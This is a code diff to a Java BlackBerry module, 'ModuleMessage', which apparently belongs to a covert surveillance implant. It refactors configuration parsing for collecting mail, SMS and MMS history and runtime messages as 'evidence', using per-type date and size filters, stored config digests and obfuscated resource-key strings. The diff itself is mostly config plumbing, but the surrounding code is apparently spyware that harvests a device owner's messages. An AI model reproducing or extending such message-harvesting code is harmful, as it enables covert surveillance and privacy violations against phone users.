@@ -9,6 +9,7 @@
  * *************************************************/
 package blackberry.module;
 
+import java.io.IOException;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Vector;
@@ -27,6 +28,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
+import blackberry.evidence.Markup;
 import blackberry.evidence.TimestampMarkup;
 import blackberry.interfaces.MailObserver;
 import blackberry.interfaces.MmsObserver;
@@ -61,6 +63,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     protected static final int SLEEPTIME = 5000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
 
+    private static final int ID_MAIL = 0;
+    private static final int ID_SMS = 1;
+    private static final int ID_MMS = 2;
+
     boolean mailEnabled;
     boolean smsEnabled;
     boolean mmsEnabled;
@@ -70,13 +76,16 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     MmsListener mmsListener;
 
     TimestampMarkup markupDate;
+    private Markup configMarkup;
     //public Date lastcheck = new Date(0);
 
     protected String identification;
     //public IntHashtable filtersSMS = new IntHashtable();
     //public IntHashtable filtersMMS = new IntHashtable();
-    Filter filterEmailCollect;
-    Filter filterEmailRuntime;
+    //Filter filterEmailCollect;
+    //Filter filterEmailRuntime;
+    private Filter[] filterCollect = new Filter[3];
+    private Filter[] filterRuntime = new Filter[3];
 
     //boolean firstRun;
     Thread historyThread = null;
@@ -119,62 +128,71 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     }
 
-    public boolean parse(ConfModule conf) {
+    public boolean parse(ConfModule jsonConf) {
         setPeriod(NEVER);
         setDelay(100);
+
+        configMarkup = new Markup(this, 1);
+
+        String[] config = new String[] { "", "", "" };
+        String[] oldConfig = new String[] { "", "", "" };
+        if (configMarkup.isMarkup()) {
+            try {
+
+                oldConfig = configMarkup.readMarkupStringArray();
+            } catch (Exception e) {
+
+                oldConfig = new String[] { "", "", "" };
+            }
+        }
 
         //#ifdef DEBUG
         debug.trace("parse");
         //#endif
 
         try {
-            //18.1=mail
-            ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
-            //18.2=enabled
-            mailEnabled = mailJson
-                    .getBoolean(Messages.getString("18.2"), false); //$NON-NLS-1$
 
-            if (mailEnabled) {
-                //18.3=filter
-                ChildConf mailFilter = mailJson.getChild(Messages
-                        .getString("18.3")); //$NON-NLS-1$
+            mailEnabled = readJson(ID_MAIL, Messages.getString("18.1"),
+                    jsonConf, config);
+            smsEnabled = readJson(ID_SMS, Messages.getString("18.7"), jsonConf,
+                    config);
+            mmsEnabled = readJson(ID_MMS, Messages.getString("18.9"), jsonConf,
+                    config);
+            
+            //#ifdef DEBUG
+            debug.trace("parse, mail: " + mailEnabled);
+            debug.trace("parse, sms: " + smsEnabled);
+            debug.trace("parse, mms: " + mmsEnabled);            
+            //#endif
 
-                int maxSizeToLog = 4096;
-                status.firstMessageRun = true;
-                // 18.4=history
-                mailHistory = mailFilter.getBoolean(
-                        Messages.getString("18.4"), false); //$NON-NLS-1$
-                if (mailHistory) {
-                    //18.5=datefrom
-                    mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-                    //18.6=dateto
-                    if (mailFilter.has(Messages.getString("18.6"))) {
-                        mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
-                    }
-                    filterEmailCollect = new Filter(mailHistory, mailFrom,
-                            mailTo, maxSizeToLog, maxSizeToLog);
-
-                    //#ifdef DEBUG
-                    debug.trace("parse, mail History");
-                    //#endif
-                }
-
-                filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
+            if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
                 //#ifdef DEBUG
-                debug.trace("parse, mail Runtime");
+                debug.trace("parse, changed Mail config");
+                //#endif
+                markupDate.removeMarkup();
+            }
+
+            if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
+                //#ifdef DEBUG
+                debug.trace("parse, changed SMS config");
                 //#endif
             }
 
-            //18.7=sms
-            ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
-            //18.8=enabled
-            smsEnabled = smsJson.getBoolean(Messages.getString("18.8"), false); //$NON-NLS-1$
+            if (!config[ID_MMS].equals(oldConfig[ID_MMS])) {
+                //#ifdef DEBUG
+                debug.trace("parse, changed MMS config");
+                //#endif
+            }
 
-            //18.9=mms
-            ChildConf mmsJson = conf.getChild(Messages.getString("18.9")); //$NON-NLS-1$
-            //18.10=enabled
-            mmsEnabled = mmsJson.getBoolean(Messages.getString("18.10"), false); //$NON-NLS-1$
+            configMarkup.writeMarkupStringArray(config);
+
         } catch (ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("parse"); //$NON-NLS-1$
+            //#endif
+            return false;
+        } catch (IOException e) {
             //#ifdef DEBUG
             debug.error(e);
             debug.error("parse"); //$NON-NLS-1$
@@ -183,6 +201,35 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         }
 
         return true;
+    }
+
+    private boolean readJson(int id, String child, ConfModule jsonconf,
+            String[] config) throws ConfigurationException {
+        ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
+        boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
+        String digestConfMail = child + "_" + enabled;
+
+        if (enabled) {
+            ChildConf filter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
+            boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+            int maxSizeToLog = 4096;
+            digestConfMail += "_" + history;
+            if (history) {
+                Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
+                Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
+                maxSizeToLog = filter.getInt("maxsize", 4096);
+
+                filterCollect[id] = new Filter(history, from, to, maxSizeToLog,
+                        maxSizeToLog);
+                digestConfMail += "_" + from + "_" + to;
+            }
+            filterRuntime[id] = new Filter(enabled, maxSizeToLog);
+
+        }
+
+        config[id] = digestConfMail;
+
+        return enabled;
     }
 
     /*
@@ -204,15 +251,12 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (mailEnabled) {
             //#ifdef DBC
-            Check.asserts(filterEmailCollect != null, "null filterEmailCollect");
+            Check.asserts(filterRuntime[ID_MAIL] != null,
+                    "null filterRuntime[ID_MAIL]");
             //#endif
             mailListener.addSingleMailObserver(this);
 
-            if (status.firstMessageRun) {
-                //#ifdef DEBUG
-                debug.info("First Run"); //$NON-NLS-1$
-                //#endif
-                status.firstMessageRun = false;
+            if (filterCollect[ID_MAIL] != null) {
 
                 if (historyThread != null) {
                     //#ifdef DEBUG
@@ -328,18 +372,16 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         return tokens;
     }
 
-    public synchronized void lastcheckSet(String key, Date date) {
+    public synchronized void lastcheckSet(String key, Date date){
+        lastcheckSet(key, date, true);
+    }
+    
+    public synchronized void lastcheckSet(String key, Date date, boolean force) {
         //#ifdef DEBUG
         debug.trace("Writing markup: " + key + " date: " + date); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
-        final ModuleMessage agent = (ModuleMessage) ModuleMessage.getInstance();
-
-        if (agent != null) {
-            agent.markupDate.put(key, date);
-        } else {
-            markupDate.put(key, date);
-        }
+        markupDate.put(key, date, force);
 
     }
 
@@ -357,9 +399,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (date == null) {
             date = new Date(0);
-            markupDate.put(key, date);
+            markupDate.put(key, date, true);
         }
         return date;
+    }
+
+    public synchronized void lastcheckSave() {
+        markupDate.save();
     }
 
     public synchronized void lastcheckReset() {
@@ -687,20 +733,20 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     public Filter getFilterEmailRealtime() {
         //#ifdef DBC
         if (mailEnabled) {
-            Check.requires(filterEmailRuntime != null,
+            Check.requires(filterRuntime[ID_MAIL] != null,
                     "getFilterEmailRuntime: null filterEmailRuntime ");
         }
         //#endif
-        return filterEmailRuntime;
+        return filterRuntime[ID_MAIL];
     }
 
     public Filter getFilterEmailCollect() {
         //#ifdef DBC
         if (mailHistory) {
-            Check.requires(filterEmailCollect != null,
+            Check.requires(filterCollect[ID_MAIL] != null,
                     "getFilterEmailCollect: null filterEmailCollect ");
         }
         //#endif
-        return filterEmailCollect;
+        return filterCollect[ID_MAIL];
     }
 }
